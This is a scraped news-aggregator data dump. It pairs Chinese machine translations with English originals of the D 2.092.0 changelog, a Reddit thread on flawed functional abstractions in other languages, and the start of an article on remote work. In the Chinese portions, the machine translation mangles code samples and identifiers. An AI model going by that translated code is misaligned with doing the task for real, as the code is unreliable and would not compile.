是指向内存对象图的唯一指针。所有者指针通常没有范围属性。如果使用不是从跟踪指针派生的表达式初始化具有作用域属性的指针，则该指针是所有者。\n如果将所有者指针分配给另一个所有者指针，则前者进入未定义状态。\n借用的指针是临时成为指向内存对象图的唯一指针的指针。它通过从所有者指针赋值进入该状态，然后所有者进入Lent状态，直到最后一次使用借用的指针。\n借用的指针必须具有Scope属性，并且必须是指向可变的指针。\n只读指针从所有者处获取其值。当只读指针处于活动状态时，只能从该所有者获取只读指针。只读指针必须具有Scope属性，并且不能是指向可变的指针。\n借用或只读指针值的生存期从第一次读取时开始(而不是在初始化或赋值时)，并在上次读取该值时结束。\n为其分配存储(例如堆栈上的局部变量)，这会将指针置于未定义状态。\n赋值-源指针和目标指针根据它们所处的状态以及它们的类型和存储类更改状态。\n传递给OUT函数参数(函数返回后更改状态)，与初始化处理相同。\n通过ref传递给函数参数，根据参数的存储类和类型将其视为对BORROW或READONY的赋值。\n它按值传递给函数参数，该参数被视为对该参数的赋值。\n将获取指针的地址，该地址将被视为分配给接收该地址的任何人。\n获取内存对象图的任何部分的地址，该地址被视为分配给接收该地址的任何人\n从内存对象图的任何部分读取指针值，将其视为对接收该指针的任何人的赋值。\n控制流的合并基于每个变量从每条边获得的状态来协调每个变量的状态。\n作为一个原型，有很多方面还没有被处理，直到原型显示出它是一个好的设计，才会被处理。\n预计会有很多错误。请将它们报告给Bugzilla，并使用关键字&#34；ob&#34；进行标记。没有必要报告这里列举的其他限制。\n追踪的是所有者的泄密情况，而不是其他指针。如果借款人不是从指针初始化的，则它们被视为所有者。\n@live void uhoh(){scope p=malloc()；//p被视为所有者作用域const pc=malloc()；//pc不被视为所有者}//退出时未检测到悬挂指针pc。\n像作用域这样的指针似乎没有多大意义，也许这可以通过犯这样一个错误来解决。\n@live void Ohno(){auto p=malloc()；void skaky(){free(P)；}skinaky()；free(P)；//未检测到双重释放}\n@live void leaky(){auto p=malloc()；Pcher()；//抛出异常，p泄漏释放(P)；}。\nvoid*xmalloc(Size_T)；void xfree(void*)；void*ymalloc(Size_T)；void yfree(void*)；auto p=xmalloc(20)；yfree(P)；//应该改为调用xfree。\nu*umalloc()；void ufree(U*)；V*vmalloc()；void vfree(V*)；auto p=umalloc()；vfree(P)；//类型不匹配。\n各种函数(如printf)的参数被视为已使用。虽然安全，但这似乎不是很实用，很可能需要重新考虑。\n添加了-PREVIEW=in，以使存储类中的平均作用域为常量。尽管在技术上定义为Const Scope，但In存储类在此预览切换之前从未实现为Const Scope。现在已经完成了实现，In应该是纯输入函数参数的首选存储类。\n根据printf的格式说明符验证printf和scanf(也是变体)参数，它采用宽泛而不是严格的兼容性视图。例如，可以使用有符号说明符设置无符号值的格式。\n通过为类printf函数添加杂注(Printf)或为类scanf函数添加杂注(Scanf)前缀来检测类似printf和scanf函数。\n将FORMAT参数紧跟在.之前。对于非v函数，或紧跟在va_list参数之前(这是&#34；v&#34；printf和scanf的变体的最后一个参数)\n现在支持环境变量SOURCE_DATE_EPOCH，环境变量SOURCE_DATE_EPOCH用于可重复构建。它是UNIX时间戳(自1970-01-01 00：00：00以来的秒数)，如下所述。DMD现在可以正确识别它，并将相应地设置__DATE__、__TIME__和__TIMESTAMP__内标识。\n添加了类似C#/Java isAssignableFrom的TypeInfo_Class/TypeInfo_Interface.isBaseOf。如果参数和接收器相等，或者如果参数表示的类继承了接收器表示的类，则TypeInfo_Class.isBaseOf返回TRUE。这称为isBaseOf，而不是isAssignableFrom，以避免重载opAssign的类混淆，因此可能允许从继承层次结构之外的类进行赋值，并与D运行时中的现有术语相匹配。TypeInfo_Interface.isBaseOf类似于参数可以是TypeInfo_Class或TypeInfo_Interface。\nclass ClassA{}class ClassB：ClassA{}auto a=new ClassA()，b=new ClassB()；Assert(typeid(A).isBaseOf(typeid(A)；Assert(typeid(A).isBaseOf(typeid(B)；Assert(！typeid(B).isBaseOf(typeid(A))；\n添加core.ememy.pageSize和minumPageSize。这是一个编译时间、特定于平台的值。此值可能不准确，因为可能会更改此值。只要有可能，请改用pageSize，它是在运行时初始化的。\n当上下文需要编译时已知值时，最小大小非常有用，比如静态数组的大小：ubyte[minumPageSize]缓冲区。\n现在可以将ISO 8601周日历转换为日期和日期时间使用的公历。\n日期由ISO周日历中的年份、周编号和一周中的某一天构成。Date.fromISOWeek(2020，11，DayOfWeek.mon)将得到日期(2020，3，9)。\n由于公历中的年份和ISO周日历中的年份并不总是相同的，因此有一个新的.isoWeekYear属性来获取ISO周日历中Date对象的年份。如果您经常在它们之间进行转换，请考虑使用.isoWeekAndYear一步计算周数和年份。\n模块std.xml已弃用模块std.xml已弃用。任何仍然需要它的代码都可以改用不死族。对于解析XML文件，我们建议使用复制包dxml。\nstd.digest.digest中不推荐使用的别名已删除，它们从2.076.1开始就不推荐使用，现在已删除。改为导入std.digest或其子模块。\n此外，std.digest.digest的弃用周期已经启动，该模块将在2.101中删除。\n隐藏目录现在被忽略。大多数POSIX文件系统上的隐藏目录都以句点开头。例如.dub。默认情况下，dub忽略隐藏文件(例如.swap.file.d)，但不忽略隐藏目录。一些操作系统会创建DUB试图包含以进行编译的隐藏目录。此版本现在将正确忽略隐藏目录，除非这些目录在DUB配方文件中特别指定。\nD2.092.0：bugzilla 20084中所有错误修复和增强的列表：通过自动引用返回不安全-以及针对输入引用和引用的不同代码。\nbugzilla 20711：对象。update需要&#34；update&34；回调来浪费地返回更新值的副本。\nbugzilla 20741：dup，idup用于数组加上键，用于内置关联数组的值：如果已知类型具有postblit，则不发出用于非postblit路径的代码，反之亦然", "note_en": "List of all bug fixes and enhancements in D 2.092.0.    CLI switches  -revert=import and  -transition=checkimports have been removed  Those switched were already not doing anything and had been deprecated for a while.\rThe compiler will no longer recognized them.\n  GNU ABI tags are a feature that was added with C++11 in  GCC 5.1.\rIn order for D to fully support the  standard C++ library,\rDMD now recognize the special UDA  gnuAbiTag, declared in  core.attribute and publicly aliased in  object\r(so one need not import anything to use it).\rThe ABI tags are a low level feature that most user will not need to interact with,\rbut can be used to bind to C++ libraries that need it.\rIn particular, it is required to bind   std::string\rwhen targeting C++11 and higher (DMD switch  -extern-std={c++11,c++14,c++17}).\n      Only one  gnuAbiTag can be present on a symbol at a time.\rThe order of the array entries does not matter (they are sorted on output).\rThe UDA will only have an effect if  -extern-std=c++11 or higher is passed\rto the compiler. The default ( -extern-std=c++98) will ignore the UDA.\rThis UDA can only be applied to  extern(C++) symbols and cannot be applied to namespaces.\n  Module constructors and destructors which are not extern(D) are deprecated  Module constructors and destructors (shared or not) could be marked with\ra different linkage than  extern(D), which would affect their mangling.\rSince such a mangling is simple and predictable, there was a very small\rchance of conflict if two same kind of constructor/destructors\rwere declared in similar condition, for example if the third\rmodule constructor in module  a was on line 479 and the third\rmodule constructor in module  b was also on line 479,\rthey would have the same mangling.\n  While it&#39;s unlikely that such a bug is triggered in practice,\raffected symbols will now trigger a deprecation message.\n  DIP25 violations will now issue deprecations by default  DIP25 has been available since  v2.067.0,\rfirst as its own switch, and more recently under the  -preview=dip25 switch.\rThe feature is now fully functional and has been built on, for example by DIP1000.\n  Starting from this release, code that would trigger errors when  -preview=dip25 is passed to the compiler\rwill also trigger a deprecation message without  -preview=dip25.\rThe behavior of the switch is unchanged (errors will still be issued).\n  DIP25 aims to make it impossible for  @safe code to refer to destructed object.\rIn practice, functions and methods returning a  ref to their parameter might\rbe required to qualify the method or the parameter as  return, as hinted by the compiler.\n  struct Foo\r{\r  int x;\r  // returning `this.x` escapes a reference to parameter `this`, perhaps annotate with `return`\r  ref  int method()  /* return */ {  return  this.x; }\r}\r // returning `v` escapes a reference to parameter `v`, perhaps annotate with `return`\r ref  int identity( /* return */  ref  int v) {  return v; }\n  In both cases, uncommenting the  return annotation will appease the compiler.\rThe complete description of DIP25 can be found  here.\n  Prototype Ownership/Borrowing System for Pointers  An Ownership/Borrowing (aka OB) system for pointers can guarantee that\rdereferenced pointers are pointing to a valid memory object.\n    This is a prototype OB system adapted to D. It is initially for pointers\ronly, not dynamic arrays, class references, refs, or pointer fields\rof aggregates. Adding support for such adds complexity,\rbut does not change the nature of it, hence it is deferred to later.\rRAII objects can safely manage their own memory, so are not covered\rby OB. Whether a pointer is allocates memory using the GC or some other\rstorage allocator is immaterial to OB, they are not distinguished and are\rhandled identically.\n  The system is only active in functions annotated with the  @live attribute.\rIt is applied after semantic processing is done as purely a check\rfor violations of the OB rules. No new syntax is added. No change is made\rto the code generated.\rIf  @live functions\rcall non- @live functions, those called functions are expected to present\ran  @live compatible interface, although it is not checked.\rif non- @live functions call  @live functions, arguments passed are\rexpected to follow  @live conventions.\n      It will not detect attempts to dereference  null pointers or possibly\r null pointers. This is unworkable because there is no current method\rof annotating a type as a non- null pointer.\n      For each memory object, there can exist either exactly one mutating pointer\rto it, or multiple non-mutating (read-only) pointers.\n    The single mutating pointer is called the &#34;owner&#34; of the memory object.\rIt transitively owns the memory object and all memory objects accessible\rfrom it (i.e. the memory object graph). Since it is the sole pointer to\rthat memory object, it can safely\rmanage the memory (change its shape, allocate, free and resize) without\rpulling the rug out from under any other pointers (mutating or not)\rthat may point to it.\n  If there are multiple read-only pointers to the memory object graph,\rthey can safely read from it without being concerned about the memory\robject graph being changed underfoot.\n  The rest of the design is concerned with how pointers become owners,\rread only pointers, and invalid pointers, and how the Core OB Principle\ris maintained at all times.\n    The only pointers that are tracked are those declared in the  @live function\ras  this, function parameters or local variables. Variables from other\rfunctions are not tracked, even  @live ones, as the analysis of interactions\rwith other functions depends\rentirely on that function signature, not its internals.\rParameters that are  const are not tracked.\n      The owner is the sole pointer to a memory object graph.\rAn Owner pointer normally does not have a  scope attribute.\rIf a pointer with the  scope attribute is initialized\rwith an expression not derived from a tracked pointer, it is an Owner.\n  If an Owner pointer is assigned to another Owner pointer, the\rformer enters the Undefined state.\n    A Borrowed pointer is one that temporarily becomes the sole pointer\rto a memory object graph. It enters that state via assignment\rfrom an owner pointer, and the owner then enters the Lent state\runtil after the last use of the borrowed pointer.\n  A Borrowed pointer must have the  scope attribute and must\rbe a pointer to mutable.\n    A Readonly pointer acquires its value from an Owner.\rWhile the Readonly pointer is live, only Readonly pointers can\rbe acquired from that Owner.\rA Readonly pointer must have the  scope attribute and also\rmust not be a pointer to mutable.\n    The lifetime of a Borrowed or Readonly pointer value starts when it is\rfirst read (not when it is initialized or assigned a value), and ends at\rthe last read of that value.\n        storage is allocated for it (such as a local variable on the stack),\rwhich places the pointer in the Undefined state\n    assignment - the source and target pointers change state based on what\rstates they are in and their types and storage classes\n  passed to an  out function parameter (changes state after the function returns),\rtreated the same as initialization\n  passed by  ref to a function parameter, treated as an assignment to a Borrow or a Readonly\rdepending on the storage class and type of the parameter\n    it is passed by value to a function parameter, which is\rtreated as an assignment to that parameter.\n    the address of the pointer is taken, which is treated as assignment to whoever\rreceives the address\n  the address of any part of the memory object graph is taken, which is\rtreated as assignment to whoever receives that address\n  a pointer value is read from any part of the memory object graph,\rwhich is treated as assignment to whoever receives that pointer\n  merging of control flow reconciles the state of each variable based on the\rstates they have from each edge\n    Being a prototype, there are a lot of aspects not dealt with yet, and\rwon&#39;t be until the prototype shows that it is a good design.\n    Expect lots of bugs. Please report them to bugzilla and tag with the &#34;ob&#34;\rkeyword. It&#39;s not necessary to report the other limitations that are enumerated here.\n        Owners are tracked for leaks, not other pointers.\rBorrowers are considered Owners if they are initialized from other than\ra pointer.\n  @live  void uhoh()\r{\r  scope p = malloc();  // p is considered an Owner\r  scope  const pc = malloc();  // pc is not considered an Owner\r}  // dangling pointer pc is not detected on exit\n  It doesn&#39;t seem to make much sense to have such pointers as\r scope, perhaps this can be resolved by making such an error.\n      @live  void ohno()\r{\r  auto p = malloc();\r\r  void sneaky() { free(p); }\r\r sneaky();\r free(p);  // double free not detected\r}\n      @live  void leaky()\r{\r  auto p = malloc();\r pitcher();  // throws exception, p leaks\r free(p);\r}\n                    void* xmalloc(size_t);\r void xfree( void*);\r\r void* ymalloc(size_t);\r void yfree( void*);\r\r auto p = xmalloc(20);\ryfree(p);  // should call xfree() instead\n      U* umalloc();\r void ufree(U*);\r\rV* vmalloc();\r void vfree(V*);\r\r auto p = umalloc();\rvfree(p);  // type mismatch\n      Arguments to variadict functions (like  printf) are considered to be consumed.\rWhile safe, this doesn&#39;t seem to be very practical, and will likely need revisiting.\n  Added  -preview=in to make the  in storage class mean  scope const.  Although technically defined to be  const scope, the  in storage\rclass has never been implemented as such until this preview switch.\rWith the implementation now done,  in should be the storage class\rof choice for purely input function parameters.\n  Validate printf and scanf (variants too) arguments against format specifiers    For printf, it takes a generous, rather than strict, view of compatiblity.\rFor example, an unsigned value can be formatted with a signed specifier.\n                          Printf-like and scanf-like functions are detected by prefixing them\rwith  pragma(printf) for printf-like functions or  pragma(scanf) for scanf-like functions.\n    have the format parameter immediately precede the  ... for non-v functions,\ror immediately precede the  va_list parameter (which is the last parameter for &#34;v&#34;\rvariants of  printf and  scanf)\n  Environment variable  SOURCE_DATE_EPOCH is now supported  The environment variable  SOURCE_DATE_EPOCH is used for\r reproducible builds.\rIt is an UNIX timestamp (seconds since 1970-01-01 00:00:00),\ras described  here.\rDMD now correctly recognize it and will set the  __DATE__,\r __TIME__, and  __TIMESTAMP__ tokens accordingly.\n  Added TypeInfo_Class/TypeInfo_Interface.isBaseOf that works like C#/Java isAssignableFrom.  TypeInfo_Class.isBaseOf returns true if the argument and the receiver\rare equal or if the class represented by the argument inherits from the\rclass represented by the receiver. This is called  isBaseOf instead of\r isAssignableFrom to avoid confusion for classes that overload\r opAssign and so may allow assignment from classes outside their\rinheritance hierarchy and to match existing terminology in the D\rruntime.  TypeInfo_Interface.isBaseOf is similar with the addition\rthat the argument may be either  TypeInfo_Class or\r TypeInfo_Interface.\n  class ClassA {}\r class ClassB : ClassA {}\r\r auto a =  new ClassA(), b =  new ClassB();\r\r assert( typeid(a).isBaseOf( typeid(a)));\r assert( typeid(a).isBaseOf( typeid(b)));\r assert(! typeid(b).isBaseOf( typeid(a)));\n  Add  core.memory.pageSize and  minimumPageSize.        This is a compile time, platform specific value. This value might not\rbe accurate, since it might be possible to change this value. Whenever possible,\rplease use  pageSize instead, which is initialized during runtime.\n  The minimum size is useful when the context requires a compile time known value,\rlike the size of a static array:  ubyte[minimumPageSize] buffer.\n  It is now possible to convert from the ISO 8601 week calendar into the\rGregorian calendar which is used by Date and DateTime.\n  Dates are constructed from the year in the ISO week calendar, the week number\rand a day of week.  Date.fromISOWeek(2020, 11, DayOfWeek.mon) will result in\r Date(2020, 3, 9).\n  As the year in the Gregorian calendar and the year in the ISO week calendar are\rnot always the same there is a new  .isoWeekYear property to get the year of\rthe  Date object in the ISO week calendar. If you convert between them often,\rconsider using  .isoWeekAndYear to compute both week number and year in one\rstep.\n  Deprecated module  std.xml  The module  std.xml has been deprecated. Any code that still needs\rit can use  UndeaD instead.\rFor parsing xml files, we recommend to use the dub package\r dxml.\n  The deprecated aliases in std.digest.digest were removed  They were deprecated since 2.076.1 and have now been removed.\rImport  std.digest or its submodules instead.\n  Additionally the deprecation cycle for  std.digest.digest was started\rand the module will be removed in 2.101.\n  Hidden directories are now ignored.  A hidden directory on most Posix file systems starts with a period. e.g.\r .dub. By default, dub ignored hidden files (e.g.  .swap.file.d), but not\rhidden directories. Some operating systems create hidden directories that dub\rwould try to include for compilation. This release now will properly ignore\rhidden directories, unless those directories are specifically named in the dub\rrecipe file.\n    List of all bug fixes and enhancements in D 2.092.0:    Bugzilla 20084: return by auto ref unsafe - and different code for inout ref and ref.\n            Bugzilla 20711: object.update requires the &#34;update&#34; callback to wastefully return a copy of the updated value\n  Bugzilla 20741:  dup,  idup for arrays plus  keys,  values for built-in associative arrays: if a type is known to have a postblit do not emit code for the non-postblit path and vice versa", "posttime": "2020-05-20 05:34:13", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "增加,adds,指针", "title": "Dlang增加了Borrowcheckker", "title_en": "Dlang Adds Borrowchecker", "transed": 1, "url": "https://dlang.org/changelog/2.092.0.html#ob", "via": "", "real_tags": ["增加", "adds", "指针"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002878, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "你有没有其他语言或语言特性的库的例子，它们真的应该实现一个众所周知的概念(Monoid、Monad、Alternative等等)，但它们没有实现，因为它们(可能)不知道这个概念？例如违反法律、缺少函数、过于复杂的函数类型等。\n我遇到过很多这样的例子，他们总是折磨我。但无论如何，我现在什么都想不起来了。\n级别1，因为即使它们有一个等同于PURE的函数，它的行为也不太像PURSE。相反，它们的等价物mx&gt；&gt；=f检查f是否返回Promise类型的值，如果不是，它的行为类似于mx&gt；&gt；=pure。f；反之亦然，如果你试图用他们的纯洁来许下诺言。因此，不可能有Promise(Promise A)类型的计算，它将被解释为Promise a。\n第2级类似地，人们相当频繁地在TypeScript中使用x|null作为可选类型。TypeScript可以执行严格的NULL检查，以确保您可以处理NULL，这将使您有90%的时间获得正确的可能类型。但是，无法编码在某些情况下出现的“可能”(可能是X)。\n第二层谢谢，这正是我要找的。这实际上让我想起了另一个破损的Monad实例：Java是可选的。\nJava有时将NULL视为Optional.Empty，有时将其视为NullPointerException，这违反了各种法律。\n级别2我发现更糟糕的是，很多承诺都是这样运作的：\n如果foo有自由变量并且表达式发生变异，则结果不是确定性的。而且你还需要像Promises这样的东西，都是取消的！\n在重构时，这是相当糟糕的。在Java中，我通常只使用一个包装类，它将承诺包装在回调中，直到实际运行。\n1级Python有一个用于折叠+运算符的SUM函数：SUM([1，2，3，4])==10。您甚至可以为其提供默认值0以外的起始值，以便将其与数字以外的对象一起使用：SUM([[1，2]，[3，4]]，[])==[1，2，3，4]。由于+是可重载的，因此可以将其用作任意么半群…的mconat操作。除了…。您不能在字符串上使用它。为什么？因为圭多是这么说的，这就是原因。SUM([&#34；one&#34；，&#34；Two&#34；，&#34；Three&#34；，&#34；Four&#34；]，&#34；&#34；)引发TypeError：sum()Can&#39；t SUM字符串[改用&#39；&#39；.join(Seq)]。\n级别2如果SUM对字符串有效，那么将会有多种连接字符串的方式，这在Python禅宗看来是不可接受的。\n级别1可能会引起争议，但在大多数语言中，几乎每个变量都使用null反模式，该反模式可以使用“可能的单体”实现，顺便说一句，当您有可选值时，这将使其显式。另外，解析器，它们很可能是应用程序。\n第二级，我认为人们低估了符号和哈斯克尔的类型系统让“可能”发挥多大作用。\n例如，即使您实际上修复了Java的可选，以便它在语法上有意义，尝试使用它仍然是地狱般的事情，因为函数不能优雅地组合。\n在没有良好的函数组合支持的语言中，单体、函数器和应用程序都非常糟糕，因为这些接口都要求轻量级的可组合闭包符合人体工程学。\n如果没有这一点，做正确的事情的摩擦会变得如此之高，以至于它不再成为明智的选择。\n1级Python生成器。我原以为它们是懒惰的列表或美化的延续，但是Python开发人员也希望它们具有线性-所以您只能使用它们一次。尽管如此，它们不会操作类似MonadFail的操作、带有失败状态，也不会抛出异常，而是会自动变异为一个空生成器，因此如果有人重用引用，您的数据就会静悄悄地消失。它将其他功能中的纯遍历改变为突变。\n从Python2到Python3的主要变化之一是，许多函数从返回列表切换到返回生成器。我们有一个纯&34；函数，它关闭在一个列表上，在第一次被调用后神秘地开始给出不同的结果，因为上游的某个东西无辜地调用了map。\n级别1年前，我在一个项目中工作，我必须部署一个数据科学管道，我们选择了Python项目Airflow来完成这项任务。\nAirflow是与Web应用程序一起使用的工作流管理器，用于可视化进度、成功和失败，并发出某些命令，如重新运行作业或取消作业。\nAirflow利用DAG数据结构来组织工作流，工作效果很好，但是当您想要在新的DAG中运行或包装现有的DAG时，他们提供了子DAG的概念，不幸的是，子DAG的行为与DAG不同，并且有各种相关的错误。\n换句话说，子DAG是事后才想到的，这让我很恼火(尽管我已经多年没有用过气流了，但我仍然很恼火)，因为如果他们一开始就认为他们的DAG结构是一个么半群，或者至少是一个可以由图形或树叶组成的图形，那么子DAG就会是一个一流的概念。这句话的意思是，如果他们一开始就认为他们的DAG结构是一个么半群，或者至少是一个可以由图形或树叶组成的图形，那么子DAG就会是一个一流的概念。换句话说，他们甚至创造了一个子DAG的概念，这让我很恼火：它根本不应该存在。\n是啊，雷迪斯也做过类似的事情。它们有主哈希表，然后您就可以有子哈希表(使用不同的API！)。在那里面，但是..。就是这样。没有子子哈希表。\n级别1在榆树生态系统中有很多东西都是单调的，但是在榆树中没有办法对这类东西进行抽象，所以必须为每种类型重新实现有用的组合符。\n2级，你也不能对此发表任何言论。单音节是不好的语言。\n另一方面，jQuery是DOM镜头的一个非常好的实现。\n级别1期望的(任一)和可选的(可能)不是单体。SY Brand甚至创建了自己的版本来解决这个问题(我猜是通过使用和_TGen组合器)。\n有一个单一的尝试方案，它试图模拟Haskell的DO符号来表示预期(如果我没记错的话)。但它很笨重，不像哈斯克尔那样。\n它们可以使用统一的类似do-notation的语法来完成，该语法也适用于前面的所有要点。但事实并非如此，C++在语法和复杂性方面都在增长，并忽略了这一明显的可能性。我猜类似Do的符号和单体将在一段时间后进入C++，但为时已晚。\nC++有更多来自FP的损坏的东西，但是告诉我C++中还有什么东西没有损坏。\n第2级流行的文化是拒绝任何哪怕是一点点性能损失的特性。可以理解，但是很可悲。", "note_en": "Do you have any examples of libraries in other languages or language features, which really should have implemented a well-known concept (Monoid, Monad, Alternative, whatever), but they fell short because they (probably) didn&#39;t know the concept? For example a broken law, a missing function, over-complicated function types, etc.\n I encountered multiple such examples, and they always grind my gears. But for the life of me, I can&#39;t remember any of them now.\n   level 1  because even though they do have a function which is the equivalent of  pure, it doesn&#39;t quite behave like  pure. Instead, their equivalent of  mx &gt;&gt;= f checks if  f returns a value of type Promise or not, and if not, it behaves like  mx &gt;&gt;= pure . f; and vice-versa if you try to use their  pure on a Promise. As a result, it&#39;s impossible to have a computation of type  Promise (Promise a), it will instead get interpreted as a  Promise a.\n level 2  Similarly, people use  x | null as a optional type in typescript fairly often. Typescript can do strict null checking to make sure that you can handle the null, which gets you 90% of the way to a proper Maybe type. However, there’s no way to encode a  Maybe (Maybe X), which comes up in certain situations.\n  level 2  Thanks, exactly what I was looking for. It actually reminded me of another instance of a broken monad:  Java&#39;s Optional.\n Java treats  null sometimes as  Optional.empty, other times as  NullPointerException, which breaks all sorts of laws.\n    level 2  What I find so much worse is that a lot of promises work like this:\n  If foo had free variables and expression mutates, the result isn&#39;t deterministic. And you still need something like Promise.all for cancellation!\n This is pretty miserable when refactoring. In Java I usually just use a wrapper class which wraps promises in a callback until actually run.\n level 1  Python has a  sum function for folding the  + operator:  sum([1, 2, 3, 4]) == 10. You can even provide it with a starting value other than the default  0 in order to use it with objects other than numbers:  sum([[1, 2], [3, 4]], []) == [1, 2, 3, 4]. Since  + is overloadable, you could use this as the mconcat operation for arbitrary monoids…except…you can’t use it on strings. Why? Because Guido said so, that’s why.  sum([&#34;one&#34;, &#34;two&#34;, &#34;three&#34;, &#34;four&#34;], &#34;&#34;) throws  TypeError: sum() can&#39;t sum strings [use &#39;&#39;.join(seq) instead].\n level 2  If sum worked on strings then there would be multiple ways of concatenating strings, which is unacceptable according to the Zen of Python.\n level 1  Potentially controversial but pretty much every variable in most languages uses the null anti-pattern, which could have been implemented using the Maybe monad, which would incidentally make it explicit when you have optional values. Also, parsers, they could very well be Applicatives.\n level 2  I think people underestimate how much do notation and Haskell&#39;s type system make Maybe &#34;work.&#34;\n Like even if you actually fixed Java&#39;s Optional so that it made sense, syntactically, it&#39;s still hell trying to use the thing because functions don&#39;t compose gracefully.\n Monads, functors, and applicatives all suck ferociously in languages that don&#39;t have good functional composition support, because those interfaces all require lightweight composable closures to be ergonomic.\n Without that, the friction of doing the right thing gets so high that it no longer becomes the smart choice.\n  level 1  Python generators. I expected them to be lazy lists or glorified continuations, but the Python devs wanted linearity out of them, too - so you can only use them once. Still, rather than having them operate something like a MonadFail, with a failure state, or throwing an exception, they mutate themselves into an empty generator, so if someone reuses a reference, your data just silently disappears. It changes pure traversals in  other functions into mutations.\n One of the major changes from Python 2 to 3 was that a bunch of functions were switched from returning lists to returning generators. We had a &#34;pure&#34; function, which closed over a list, that just mysteriously started giving different results after the first time it was called, because of something upstream innocently calling  map.\n level 1  Years ago, I was working on a project where I had to deploy a data science pipeline and we picked the Python project Airflow for this task.\n Airflow is a workflow manager along with a web application to visualize progress, success, and failure and to issue certain commands such as to rerun a job or cancel a job.\n Airflow utilizes a DAG data structure to organize a workflow, which works well, but when you want to run or wrap an existing DAG inside a new one, they offer this concept of the sub-DAG, which unfortunately behaved differently than a DAG and had various bugs associated with it.\n The sub-DAG was an afterthought, in other words, and this annoyed me (still annoys me even though I haven&#39;t used Airflow in years) because it seemed like if they had started with the idea that their DAG structure was a monoid, or at least a graph that can be composed of graphs or leaves, then &#34;sub-DAG&#34; would have been a first-class concept. In other words, it annoyed me that they even created this concept of a &#34;sub-DAG&#34;: it shouldn&#39;t have needed to exist at all.\n level 2  Yeah, Redis does something similar. They have the main hash table, and then you can have sub-hash tables (with a different API!) within that, but... that&#39;s it. There&#39;s no sub-sub hash table.\n  level 1  There are a  lot of things which are exactly monads in the Elm ecosystem, but there&#39;s no way to abstract over that sort of thing in Elm so useful combinators have to be reimplemented for each type\n level 2  And you are not allowed to say anything about it, either. &#34;Monads&#34; are bad language.\n level 1  On the flip side, jQuery is a pretty good implementation of lenses for the DOM.\n   level 1  expected (Either) and optional (Maybe) are not monads. Sy Brand even created own versions with this issue &#39;fixed&#39; (by having and_tgen combinator I guess)\n  There is a &#39;monadic try&#39; proposal which tries to simulate Haskell&#39;s do notation for expected (if I remember it right). But it&#39;s clunky and not quite as in Haskell.\n They could be done with a unified do-notation-like syntax also suitable for all the previous points. But no, C++ grows in its syntax and complexity and ignores this obvious possibility. I guess do-like notation and monads will come to C++ after a while, but it will be too late.\n C++ has even more broken things from FP, but tell me what&#39;s not yet broken in C++.\n level 2  The prevailing culture is to reject any feature which costs even the slightest bit of performance. Understandable, but sad.", "posttime": "2020-05-20 05:19:01", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "抽象,incorrect,函数", "title": "其他语言中的错误抽象示例", "title_en": "Examples of Incorrect Abstractions in Other Languages", "transed": 1, "url": "https://www.reddit.com/r/haskell/comments/glz389/examples_of_incorrect_abstractions_in_other/", "via": "", "real_tags": ["抽象", "incorrect", "函数"]}, {"category": "", "categoryclass": "", "imagename": "38e59e30e432dabfdd51391d6c075ea6.jpg", "infoid": 1002877, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "至少有一半的美国劳动力在家工作，老板们现在面临的问题不是他们的员工什么时候可以回到办公室，而是他们是否应该这样做。隔离两个多月后，美国的冠状病毒测试、接触者追踪和治疗方案仍在进行中，疫苗仍需一段时间。\n并非巧合的是，雇主们不断推迟他们预计的回归日期。当办公室真的回来时，他们可能会限制自己-因为国家命令或他们自己对防止员工生病的担忧-只有25%或30%的入住率。但这一困境的安静部分现在需要大声说出来：你应该什么时候回办公室？你不应该这么做。\n当然，各行各业的许多人--制造业、零售业、运输业、医疗业等等--都不能在家工作。然而，这场流行病表明，有多少公司可以在不将所有员工安排在同一办公室的情况下充分运作，甚至成功。如果你管理的组织的员工或多或少都在家里完成工作，那就听听你脑海中那个小小的声音吧。现在就回办公室吗？那是胡说八道。我只是告诉你你已经知道的事情。\n去办公室有几个好处：符合人体工程学的家具，工作和生活之间的精神分离，每天都有动力穿得像个成年人，走出家门。但是去办公室的主要原因是你所有的同事都在那里。\n然而，在疫苗面世之前，任何重返工作岗位的行为都会让员工保持距离，可能会戴上面具。许多办公室将以减少入住率的方式运作。人们通常聚集的地方-会议室、休息室、饮水机-可能是禁区。如此多雇主珍视的企业文化是建立在一定程度的互动基础上的，而这种互动不会简单地通过在同一栋大楼里重新获得，更不用说在只有一小部分员工在场的情况下在同一栋大楼里了。在冠状病毒疫苗问世之前，企业文化就完蛋了。\n当然，办公室规划者当然可以设想一个新的工作场所：新的隔间设计，非接触式电梯按钮，通风系统升级以确保新鲜空气，严格的清洁协议，时间表调整，以及关闭公共空间。雇主们正寻求投资于他们自己的测试系统-这是联邦政府一直无法或不愿建立的-并可能要求对所有员工进行体温检查。这一切听起来都是如此的严峻、耗时和昂贵。如果你早上的例行公事还不够长，你会喜欢排在社交距离很远的队伍里等待接受额头扫描。\n一些雇主-包括谷歌和Facebook-已经将在家工作的政策延长到秋季末或明年初。这为他们赢得了时间，让政府进行测试和追踪，以改善情况，并提供更好的治疗方法。Twitter更进一步，现在允许员工“永远”在家工作。那是很长的一段时间了。为了避免任何人认为自由派的西海岸科技公司是唯一采取这些举措的公司，福克斯新闻(Fox News)将自己的在家工作指令延长至6月15日。\n哈佛大学公共卫生学教授约瑟夫·G·艾伦(Joseph G.Allen)与哈佛商学院(Harvard Business School)教授约翰·D·麦康伯(John D.Macomber)合著的新书“健康建筑”(Healthy 